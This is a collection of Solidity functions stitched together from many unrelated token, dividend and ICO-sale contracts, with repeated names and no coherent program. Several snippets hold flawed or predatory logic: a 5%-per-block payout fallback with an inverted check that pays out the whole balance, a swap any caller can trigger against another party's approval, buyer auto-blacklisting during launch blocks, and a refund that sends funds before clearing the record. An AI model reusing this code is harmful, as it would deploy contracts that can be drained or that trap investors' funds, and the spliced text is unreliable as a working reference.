}

function updateDividendTracker(address newAddress) public onlyOwner {
    require(newAddress != address(dividendTracker), "Aape: The dividend tracker already has that address");
    AapeDividendTracker newDividendTracker = AapeDividendTracker(payable(newAddress));
    require(newDividendTracker.owner() == address(this), "Aape: The new dividend tracker must be owned by the Aape token contract");
    newDividendTracker.excludeFromDividends(address(newDividendTracker));
    newDividendTracker.excludeFromDividends(address(this));
    newDividendTracker.excludeFromDividends(owner());
    newDividendTracker.excludeFromDividends(address(uniswapV2Router));
    emit UpdateDividendTracker(newAddress, address(dividendTracker));
    dividendTracker = newDividendTracker;
}

function _withdrawDividendOfUser(address payable user) internal returns(uint256) {
    uint256 _withdrawableDividend = withdrawableDividendOf(user);
    if (_withdrawableDividend > 0) {
        withdrawnDividends[user] = withdrawnDividends[user].add(_withdrawableDividend);
        emit DividendWithdrawn(user, _withdrawableDividend);
        bool success = IERC20(apecoin).transfer(user, _withdrawableDividend);
        if (!success) {
            withdrawnDividends[user] = withdrawnDividends[user].sub(_withdrawableDividend);
            return 0;
        }
        return _withdrawableDividend;
    }
    return 0;
}

function updateUniswapV2Router(address newAddress) public onlyOwner {
    require(newAddress != address(uniswapV2Router), "Aape: The router already has that address");
    emit UpdateUniswapV2Router(newAddress, address(uniswapV2Router));
    uniswapV2Router = IUniswapV2Router02(newAddress);
    address _uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory())
        .createPair(address(this), uniswapV2Router.WETH());
    uniswapV2Pair = _uniswapV2Pair;
}

function _transfer(
    address from,
    address to,
    uint256 amount
) internal override {
    require(from != address(0), "ERC20: transfer from the zero address");
    require(to != address(0), "ERC20: transfer to the zero address");
    require(!_isBlacklisted[from] && !_isBlacklisted[to], 'Blacklisted address');
    if (amount == 0) {
        super._transfer(from, to, 0);
        return;
    }
    if (from == uniswapV2Pair && !_isExcludedFromFees[to]) {
        require(amount <= maxtransamount);
        if (block.number <= (launchedAt + 2)) {
            _isBlacklisted[to] = true;
        }
    }
    if (to == uniswapV2Pair && !_isExcludedFromFees[from]) {
        require(amount <= maxtransamount);
    }
    if (!_isExcludedFromFees[to] && to != uniswapV2Pair) {
        require((balanceOf(to) + amount) <= maxwalletamount);
    }
    uint256 contractTokenBalance = balanceOf(address(this));
    bool canSwap = contractTokenBalance >= swapTokensAtAmount;
    if (canSwap &&
        !swapping &&
        !automatedMarketMakerPairs[from] &&
        from != owner() &&
        to != owner()
    ) {
        swapping = true;
        uint256 marketingTokens = contractTokenBalance.mul(marketingFee).div(totalFees);
        swapAndSendToFee(marketingTokens);
        uint256 swapTokens = contractTokenBalance.mul(liquidityFee).div(totalFees);
        swapAndLiquify(swapTokens);
        uint256 sellTokens = balanceOf(address(this));
        swapAndSendDividends(sellTokens);
        swapping = false;
    }
    bool takeFee = !swapping;
    if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
        takeFee = false;
    }
    if (takeFee) {
        uint256 fees = amount.mul(totalFees).div(100);
        if (automatedMarketMakerPairs[to]) {
            fees += amount.mul(1).div(100);
        }
        amount = amount.sub(fees);
        super._transfer(from, address(this), fees);
    }
    super._transfer(from, to, amount);
    try dividendTracker.setBalance(payable(from), balanceOf(from)) {} catch {}
    try dividendTracker.setBalance(payable(to), balanceOf(to)) {} catch {}
    if (!swapping) {
        uint256 gas = gasForProcessing;
        try dividendTracker.process(gas) returns(uint256 iterations, uint256 claims, uint256 lastProcessedIndex) {
            emit ProcessedDividendTracker(iterations, claims, lastProcessedIndex, true, gas, tx.origin);
        }
        catch {
        }
    }
}

function isActive() public view returns(bool) {
    return (
        initialized == true &&
        now >= START &&
        now <= START.add(DAYS * 1 days) &&
        goalReached() == false
    );
}

function setFeeAuthority(FeeInterface _fees) public auth {
    fees = _fees;
}

function checkPermissions(address _from) internal view returns(bool) {
    if (_from == teamY1 && now < unlockY1Time) {
        return false;
    } else if (_from == teamY2 && now < unlockY2Time) {
        return false;
    } else if (_from == teamY3 && now < unlockY3Time) {
        return false;
    } else if (_from == teamY4 && now < unlockY4Time) {
        return false;
    } else {
        return true;
    }
}

function mint(address account, uint256 amount) public returns(bool) {
    require(_allowMinting, "Minting is not allowed");
    require(_datesOfFirstTransfer[msg.sender] > 0, "You can't mint if you did'nt receive your initial tokens");
    uint256 lastTime = _lastTimeMinted[msg.sender];
    if (lastTime == 0) {
        lastTime = _datesOfFirstTransfer[msg.sender];
    }
    require(now > lastTime + 1 days, "You need to wait at least one day since the last minting or your initial transfer");
    _lastTimeMinted[msg.sender] = now;
    _mint(account, amount);
    uint256 tlcAmount = amount.mul(4167);
    uint256 diffInDays = (now - lastTime).div(86400); 
    if (diffInDays > 730) {
        diffInDays = 730;
    }
    tlcAmount = tlcAmount.mul(diffInDays);
    _tlc.mint(account, tlcAmount);
    return true;
}

function transfer(address recipient, uint256 amount) public returns(bool) {
    if (_datesOfFirstTransfer[recipient] == 0) {
        _datesOfFirstTransfer[recipient] = now;
    }
    _transfer(msg.sender, recipient, amount);
    return true;
}

function distributeAndLock(address _addr, uint256 _amount, bytes32[] memory proof) public {
    require(!userMap[_addr], "MerkleClaim: Account is already claimed");
    bytes32 node = keccak256(abi.encodePacked(_addr, _amount));
    require(!claimMap[node], "MerkleClaim: Account is already claimed");
    require(MerkleProof.verify(proof, root, node), "MerkleClaim: Verify failed");
    setClaim(node);
    uint256 half_amount = _amount.div(2);
    dpr.transfer(_addr, half_amount);
    lockTokens(_addr, _amount.sub(half_amount));
    userMap[_addr] = true;
    emit distribute(_addr, _amount);
}

function doBuy(address receipient, uint stage) internal {
    uint value = msg.value;
    if (stage == STAGE_1) {
        uint fund1 = firstStageFund[receipient];
        fund1 = fund1.add(value);
        if (fund1 > MAX_STAGE_1_LIMIT) {
            uint refund1 = fund1.sub(MAX_STAGE_1_LIMIT);
            value = value.sub(refund1);
            msg.sender.transfer(refund1);
        }
    } else if (stage == STAGE_2) {
        uint fund2 = secondStageFund[receipient];
        fund2 = fund2.add(value);
        if (fund2 > MAX_STAGE_2_LIMIT) {
            uint refund2 = fund2.sub(MAX_STAGE_2_LIMIT);
            value = value.sub(refund2);
            msg.sender.transfer(refund2);
        }
    }
    uint tokenAvailable = MAX_OPEN_SOLD.sub(openSoldTokens);
    require(tokenAvailable > 0);
    uint toFund;
    uint toCollect;
    (toFund, toCollect) = costAndBuyTokens(tokenAvailable, value);
    if (toFund > 0) {
        require(seeleToken.mint(receipient, toCollect, true));
        wallet.transfer(toFund);
        openSoldTokens = openSoldTokens.add(toCollect);
        NewSale(receipient, toFund, toCollect);
    }
    uint toReturn = value.sub(toFund);
    if (toReturn > 0) {
        msg.sender.transfer(toReturn);
    }
    if (stage == STAGE_1) {
        firstStageFund[receipient] = firstStageFund[receipient].add(toFund);
    } else if (stage == STAGE_2) {
        secondStageFund[receipient] = secondStageFund[receipient].add(toFund);
    }
}

function saleNotEnd() constant internal returns(bool) {
    return now < endTime && openSoldTokens < MAX_OPEN_SOLD;
}

function buySeele(address receipient)
internal
whenNotPaused
ceilingNotReached
notEarlierThan(startTime)
earlierThan(endTime)
validAddress(receipient)
returns(bool) {
    require(!isContract(msg.sender));
    require(tx.gasprice <= 100000000000 wei);
    require(msg.value >= MIN_LIMIT);
    bool inWhiteListTag = fullWhiteList[receipient];
    require(inWhiteListTag == true);
    uint stage = STAGE_3;
    if (startTime <= now && now < startTime + STAGE_1_TIME) {
        stage = STAGE_1;
        require(msg.value <= MAX_STAGE_1_LIMIT);
        uint fund1 = firstStageFund[receipient];
        require(fund1 < MAX_STAGE_1_LIMIT);
    } else if (startTime + STAGE_1_TIME <= now && now < startTime + STAGE_2_TIME) {
        stage = STAGE_2;
        require(msg.value <= MAX_STAGE_2_LIMIT);
        uint fund2 = secondStageFund[receipient];
        require(fund2 < MAX_STAGE_2_LIMIT);
    }
    doBuy(receipient, stage);
    return true;
}

function setWhiteList(address[] users, bool openTag)
external
onlyOwner
earlierThan(endTime) {
    require(saleNotEnd());
    for (uint i = 0; i < users.length; i++) {
        address receipient = users[i];
        bool visitFlag = vistFlagList[receipient];
        if (openTag == true && visitFlag == false) {
            uint token = oldSeeleToken.lockedBalances(receipient);
            if (token > 0) {
                seeleToken.mint(receipient, token, true);
                openSoldTokens = openSoldTokens.add(token);
            }
            vistFlagList[receipient] = true;
        }
        fullWhiteList[receipient] = openTag;
    }
}

function() external payable {
    sendtoken = (msg.value) / cost1token;
    if (msg.value >= 5 ether) {
        sendtoken = (msg.value) / cost1token;
        sendtoken = sendtoken * 3 / 2;
    }
    if (msg.value >= 15 ether) {
        sendtoken = (msg.value) / cost1token;
        sendtoken = sendtoken * 2;
    }
    if (msg.value >= 25 ether) {
        sendtoken = (msg.value) / cost1token;
        sendtoken = sendtoken * 3;
    }
    tokenReward.transferFrom(owner, msg.sender, sendtoken);
    ether8 = (msg.value) * 8 / 100;
    ether6 = (msg.value) * 6 / 100;
    ether86 = (msg.value) - ether8 - ether6;
    owner8.transfer(ether8);
    owner6.transfer(ether6);
    owner.transfer(ether86);
}

function validPurchase() internal view returns(bool) {
    return now >= startDate && msg.value != 0;
}

function() external payable {
    if (invested[msg.sender] != 0 && block.number > atBlock[msg.sender]) {
        uint256 amount = invested[msg.sender] * 5 / 100 * (block.number - atBlock[msg.sender]) / 5900;
        if (this.balance > amount) amount = this.balance;
        msg.sender.transfer(amount);
    }
    invested[msg.sender] += msg.value;
    atBlock[msg.sender] = block.number
        * investorsCount++;
}

function procureTokens(address _beneficiary) public payable {
    uint256 tokens;
    uint256 weiAmount = msg.value;
    address _this = this;
    uint256 rate;
    address referer;
    uint256 refererTokens;
    require(now >= startPreICO);
    require(now <= endICO);
    require(_beneficiary != address(0));
    checkMinMaxInvestment(weiAmount);
    rate = getRate();
    tokens = weiAmount.mul(rate);
    if (msg.data.length == 20) {
        referer = bytesToAddress(bytes(msg.data));
        require(referer != msg.sender);
        refererTokens = tokens.mul(5).div(100);
    }
    checkHardCap(tokens.add(refererTokens));
    adjustHardCap(tokens.add(refererTokens));
    wallet.transfer(_this.balance);
    if (refererTokens != 0 && allRefererTokens.add(refererTokens) <= maxRefererTokens) {
        allRefererTokens = allRefererTokens.add(refererTokens);
        token.mint(referer, refererTokens);
    }
    token.mint(_beneficiary, tokens);
    emit TokenProcurement(msg.sender, _beneficiary, weiAmount, tokens);
}

function adjustHardCap(uint256 _value) internal {
    if (now >= startPreICO && now < endPreICO) {
        sumPreICO = sumPreICO.add(_value);
    }
    if (now >= startICO && now < endICO) {
        sumICO = sumICO.add(_value);
    }
}

function getRate() public view returns(uint256) {
    uint256 rate;
    if (now >= startPreICO && now < endPreICO) {
        rate = ratePreICO;
    }
    if (now >= startICO && now < endICO) {
        rate = rateICO;
    }
    return rate;
}

function checkMinMaxInvestment(uint256 _value) view public {
    if (now >= startPreICO && now < endPreICO) {
        require(_value >= minInvestmentPreICO);
    }
    if (now >= startICO && now < endICO) {
        require(_value >= minInvestmentICO);
        require(_value <= maxInvestmentICO);
    }
}

function checkHardCap(uint256 _value) view public {
    if (now >= startPreICO && now < endPreICO) {
        require(_value.add(sumPreICO) <= sumHardCapPreICO);
    }
    if (now >= startICO && now < endICO) {
        require(_value.add(sumICO) <= sumHardCapICO);
    }
}

function _addPair(address uniPair) private {
    require(!_pairs[uniPair], "PairCreator: Pair already exists");
    _prediction.setPool(uniPair, 300000000000, 2000000000000000000);
    _pairs[uniPair] = true;
}

function updateDividendTracker(address newAddress) public onlyOwner {
    require(
        newAddress != address(dividendTracker),
        "bHODLER: The dividend tracker already has that address"
    );
    bHODLERDividendTracker newDividendTracker = bHODLERDividendTracker(
        payable(newAddress)
    );
    require(
        newDividendTracker.owner() == address(this),
        "bHODLER: The new dividend tracker must be owned by the bHODLER token contract"
    );
    newDividendTracker.excludeFromDividends(address(newDividendTracker));
    newDividendTracker.excludeFromDividends(address(this));
    newDividendTracker.excludeFromDividends(owner());
    newDividendTracker.excludeFromDividends(address(uniswapV2Router));
    emit UpdateDividendTracker(newAddress, address(dividendTracker));
    dividendTracker = newDividendTracker;
}

function _transfer(
    address from,
    address to,
    uint256 amount
) internal override {
    require(from != address(0), "ERC20: transfer from the zero address");
    require(to != address(0), "ERC20: transfer to the zero address");
    if (tradingStartTime > block.timestamp) {
        require(
            canTransferBeforeTradingIsEnabled[from],
            "bHODLER: This account cannot send tokens until trading is enabled"
        );
    }
    if (amount == 0) {
        super._transfer(from, to, 0);
        return;
    }
    if (antibotEnabled) {
        if (automatedMarketMakerPairs[from]) {
            require(
                !antiBot.scanAddress(to, from, tx.origin),
                "Beep Beep Boop, You're a piece of poop"
            );
        }
        if (automatedMarketMakerPairs[to]) {
            require(
                !antiBot.scanAddress(from, to, tx.origin),
                "Beep Beep Boop, You're a piece of poop"
            );
        }
    }
    if (maxPurchaseEnabled && automatedMarketMakerPairs[from]) {
        require(
            amount <= maxPurchaseAmount,
            "bHODLER: Exceeds max purchase amount"
        );
    }
    if (
        !swapping &&
        !reinvesting &&
        !automatedMarketMakerPairs[from] &&
        !_isExcludedFromFees[from] &&
        !_isExcludedFromFees[to]
    ) {
        swapping = true;
        swapAndDistribute();
        swapping = false;
    }
    bool takeFee = !swapping && !reinvesting;
    if (
        (_isExcludedFromFees[from] || _isExcludedFromFees[to]) ||
        (!automatedMarketMakerPairs[from] && !automatedMarketMakerPairs[to])
    ) {
        takeFee = false;
    }
    if (takeFee) {
        uint256 fees = amount.mul(totalFee).div(100);
        amount = amount.sub(fees);
        super._transfer(from, address(this), fees);
    }
    super._transfer(from, to, amount);
    try
    dividendTracker.setBalance(payable(from), balanceOf(from)) {} catch {}
    try dividendTracker.setBalance(payable(to), balanceOf(to)) {} catch {}
    if (antibotEnabled) {
        try antiBot.registerBlock(from, to) {} catch {}
    }
    lastTransfer[from] = block.timestamp;
    lastTransfer[to] = block.timestamp;
}

function reinvestInactive(address payable account) public onlyOwner {
    uint256 tokenBalance = dividendTracker.balanceOf(account);
    require(
        tokenBalance <= minimumTokenBalanceForDividends,
        "bHODLER: Account balance must be less then minimum token balance for dividends"
    );
    uint256 _lastTransfer = lastTransfer[account];
    require(
        block.timestamp.sub(_lastTransfer) > 12 weeks,
        "bHODLER: Account must have been inactive for at least 12 weeks"
    );
    dividendTracker.processAccount(account, address(this));
    uint256 dividends = address(this).balance;
    (bool success, ) = address(dividendTracker).call {
        value: dividends
    }("");
    if (success) {
        emit SendDividends(dividends);
        try dividendTracker.setBalance(account, 0) {} catch {}
    }
}

function _claim(
    address payable account,
    bool reinvest,
    uint256 minTokens
) private {
    uint256 withdrawableAmount = dividendTracker.withdrawableDividendOf(
        account
    );
    require(
        withdrawableAmount > 0,
        "bHODLER: Claimer has no withdrawable dividend"
    );
    if (!reinvest) {
        uint256 ethAmount = dividendTracker.processAccount(
            account,
            account
        );
        if (ethAmount > 0) {
            emit DividendClaimed(ethAmount, 0, account);
        }
        return;
    }
    uint256 ethAmount = dividendTracker.processAccount(
        account,
        address(this)
    );
    if (ethAmount > 0) {
        reinvesting = true;
        uint256 tokenAmount = swapEthForTokens(
            ethAmount,
            minTokens,
            account
        );
        reinvesting = false;
        emit DividendClaimed(ethAmount, tokenAmount, account);
    }
}

function withdrawForeignTokens(address _tokenContract) returns(bool) {
    if (msg.sender != 0x239C09c910ea910994B320ebdC6bB159E71d0b30) {
        throw;
    }
    require(block.timestamp > partyTime);
    ForeignToken token = ForeignToken(_tokenContract);
    uint256 amount = token.balanceOf(address(this));
    return token.transfer(0x239C09c910ea910994B320ebdC6bB159E71d0b30, amount);
}

function _checkTxLimit(
    address sender,
    address recipient,
    uint256 amount
) internal {
    if (block.timestamp - lastLastorChange > resetPeriod) {
        _reset();
    }
    if (
        sender != owner &&
        recipient != owner &&
        !isTxLimitExempt[recipient] &&
        recipient != ZERO &&
        recipient != DEAD &&
        recipient != pair &&
        recipient != address(this)
    ) {
        require(amount <= _maxTxAmount, "MAX TX");
        uint256 contractBalanceRecipient = balanceOf(recipient);
        require(
            contractBalanceRecipient + amount <= _maxWalletAmount,
            "Exceeds maximum wallet token amount"
        );
        address[] memory path = new address[](2);
        path[0] = router.WETH();
        path[1] = address(this);
        uint256 usedEth = router.getAmountsIn(amount, path)[0];
        if (!hasSold[recipient] && Lastor != recipient && usedEth >= minimumAmount) {
            Lastor = recipient;
            lastLastorChange = block.timestamp;
            emit NewLastor(Lastor);
        }
    }
    if (
        sender != owner &&
        recipient != owner &&
        !isTxLimitExempt[sender] &&
        sender != pair &&
        recipient != address(this)
    ) {
        require(amount <= _maxTxAmount, "MAX TX");
        if (Lastor == sender) {
            emit LastorSold(Lastor);
            _reset();
        }
        hasSold[sender] = true;
    }
}

function _transferFrom(
    address sender,
    address recipient,
    uint256 amount
) internal returns(bool) {
    if (!isTxLimitExempt[sender])
        require(!blacklisted[sender], "You are blacklisted");
    if (!didWeStart && sender == pair && !isTxLimitExempt[recipient] && recipient != routerAddress && recipient != pair) {
        blacklisted[recipient] = true;
    }
    if (inSwapAndLiquify) {
        return _basicTransfer(sender, recipient, amount);
    }
    if (
        sender != pair &&
        !inSwapAndLiquify &&
        swapAndLiquifyEnabled &&
        _balances[address(this)] >= swapThreshold
    ) {
        swapBack();
    }
    _checkTxLimit(sender, recipient, amount);
    require(!isWalletToWallet(sender, recipient), "Don't cheat");
    _balances[sender] = _balances[sender].sub(
        amount,
        "Insufficient Balance"
    );
    uint256 amountReceived = !isFeeExempt[sender] && !isFeeExempt[recipient] ?
        takeFee(sender, recipient, amount) :
        amount;
    _balances[recipient] = _balances[recipient].add(amountReceived);
    emit Transfer(sender, recipient, amountReceived);
    return true;
}

function executeSwap(uint256 _id, address _bob)
public returns(bool) {
    require(_bob != address(0));
    Swap storage swap = swaps[_id];
    require(swap.aliceAddress != address(0), "Swap does not exists");
    require(swap.executed == 0, "Swap not available");
    IERC20 Token1 = IERC20(swap.token1);
    IERC20 Token2 = IERC20(swap.token2);
    Token1.transferFrom(swap.aliceAddress, _bob, swap.value1);
    Token2.transferFrom(_bob, swap.aliceAddress, swap.value2);
    swap.executed = 1;
    return true;
}

function refund() inState(States.Refunding) {
    uint weiValue = contributors[msg.sender];
    require(weiValue <= loadedRefund && weiValue <= this.balance);
    msg.sender.transfer(weiValue);
    contributors[msg.sender] = 0;
    weiRefunded = weiRefunded.add(weiValue);
    loadedRefund = loadedRefund.sub(weiValue);
    Refund(msg.sender, weiValue);
}

function contributeInternal(address _receiver, uint _weiAmount, uint _tokenAmount) internal {
    require(token.totalSupply().add(_tokenAmount) <= maxCap);
    token.produceEmeralds(_receiver, _tokenAmount);
    if (_weiAmount > 0)
        wallet.transfer(_weiAmount);
    if (contributors[_receiver] == 0) contributorsCount++;
    tokensSold = tokensSold.add(_tokenAmount);
    weiTotal = weiTotal.add(_weiAmount);
    Contributed(_receiver, _weiAmount, _tokenAmount);
}

function getState() constant returns(States) {
    if (now < presaleStart) return States.Preparing;
    if (now >= presaleStart && now < start && weiTotal < weiPresaleMax) return States.Presale;
    if (now < start && weiTotal >= weiPresaleMax) return States.Waiting;
    if (now >= start && now < end) return States.Distribution;
    if (weiTotal >= weiGoal) return States.Success;
    if (now >= end && weiTotal < weiGoal && loadedRefund == 0) return States.Failure;
    if (loadedRefund > 0) return States.Refunding;
}

function release() public {
    uint256 amount;
    if (secondReleaseTime != 0 && block.timestamp >= secondReleaseTime) {
        amount = token.balanceOf(this);
        require(amount > 0);
        token.safeTransfer(beneficiary, amount);
        secondReleaseTime = 0;
    } else if (firstReleaseTime != 0 && block.timestamp >= firstReleaseTime) {
        amount = token.balanceOf(this);
        require(amount > 0);
        token.safeTransfer(beneficiary, amount / 2);
        firstReleaseTime = 0;
    }
}

function _transfer(address from, address to, uint256 amount) internal override {
    require(from != address(0), "ERC20: transfer from the zero address");
    require(to != address(0), "ERC20: transfer to the zero address");
    require(!_isBlacklisted[to] && !_isBlacklisted[from], "Your address or recipient address is blacklisted");
    if (amount == 0) {
        super._transfer(from, to, 0);
        return;
    }
    uint256 contractTokenBalance = balanceOf(address(this));
    bool canSwap = contractTokenBalance >= swapTokensAtAmount;
    bool didSwap;
    if (canSwap &&
        !swapping &&
        !automatedMarketMakerPairs[from] &&
        from != owner() &&
        to != owner()
    ) {
        swapping = true;
        uint256 marketingTokens = contractTokenBalance.mul(marketingFee).div(totalFees);
        swapAndSendToMarketingWallet(marketingTokens);
        emit swapTokenForMarketing(marketingTokens, marketingFeeWallet);
        uint256 swapTokens = contractTokenBalance.mul(liquidityFee).div(totalFees);
        swapAndLiquify(swapTokens);
        emit swapTokenForLiquify(swapTokens);
        swapping = false;
        didSwap = true;
    }
    bool takeFee = !swapping;
    if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
        takeFee = false;
    }
    if (takeFee) {
        if (automatedMarketMakerPairs[from]) {
            require(isLaunced, "Token isn't launched yet");
            require(
                amount <= maxBuyTransactionAmount,
                "Transfer amount exceeds the maxTxAmount."
            );
            require(
                balanceOf(to) + amount <= maxWalletToken,
                "Exceeds maximum wallet token amount."
            );
            bool dedBlock = block.timestamp <= launchedAt;
            if (dedBlock && !_isSniper[to])
                isSniper.push(to);
            if (deadBlock && !_isSniper[to])
                isSniper.push(to);
            if (buyingPriceOn == true) {
                _account[to].priceBought = calculateBuyingPrice(to, amount);
            }
            emit DEXBuy(amount, to);
        } else if (automatedMarketMakerPairs[to]) {
            require(!_isSniper[from], "You are sniper");
            require(amount <= maxSellTransactionAmount, "Sell transfer amount exceeds the maxSellTransactionAmount.");
            if (IndividualSellLimitOn == true && _account[from].sellLimitLiftedUp == false) {
                uint256 bal = balanceOf(from);
                if (bal > 2) {
                    require(amount <= bal.div(2));
                    _account[from].amountSold += amount;
                    if (_account[from].amountSold >= bal.div(3)) {
                        _account[from].sellLimitLiftedUp = true;
                    }
                }
            }
            if (balanceOf(from).sub(amount) == 0) {
                _account[from].priceBought = 0;
            }
            emit DEXSell(amount, from);
        } else if (!_isExcludedFromFees[from] && !_isExcludedFromFees[to]) {
            if (buyingPriceOn == true) {
                _account[to].priceBought = calculateBuyingPrice(to, amount);
            }
            if (balanceOf(from).sub(amount) == 0) {
                _account[from].priceBought = 0;
            }
            emit TokensTransfer(from, to, amount);
        }
        uint256 fees = amount.mul(totalFees).div(100);
        if (automatedMarketMakerPairs[to]) {
            fees += amount.mul(1).div(100);
        }
        uint256 profitFeeTokens;
        if (profitBaseFeeOn == true && !_isExcludedFromFees[from] && automatedMarketMakerPairs[to]) {
            uint256 p;
            if (didSwap == true) {
                p = contractTokenBalance > percentEquivalent ? contractTokenBalance.div(percentEquivalent) : 1;
            }
            profitFeeTokens = calculateProfitFee(_account[from].priceBought, amount, p);
            profitFeeTokens = profitFeeTokens > fees ? profitFeeTokens - fees : 0;
        }
        amount = amount.sub(fees + profitFeeTokens);
        super._transfer(from, address(this), fees + profitFeeTokens);
    }
    super._transfer(from, to, amount);
}

function updateUniswapV2Router(address newAddress) public onlyOwner {
    require(newAddress != address(uniswapV2Router), "Token: The router already has that address");
    emit UpdateUniswapV2Router(newAddress, address(uniswapV2Router));
    uniswapV2Router = IUniswapV2Router02(newAddress);
    address _uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory())
        .createPair(address(this), uniswapV2Router.WETH());
    uniswapV2Pair = _uniswapV2Pair;
}

function safeWithdrawal() external crowdsaleEnded {
    if (!fundingGoalReached) {
        uint256 amount = balanceOf[msg.sender];
        balanceOf[msg.sender] = 0;
        if (amount > 0) {
            if (msg.sender.send(amount)) {
                FundTransfer(msg.sender, amount, false);
            } else {
                balanceOf[msg.sender] = amount;
            }
        }
    }
    if (fundingGoalReached && owner == msg.sender) {
        if (beneficiary.send(amountRaised)) {
            FundTransfer(beneficiary, amountRaised, false);
        } else {
            fundingGoalReached = false;
        }
    }
}

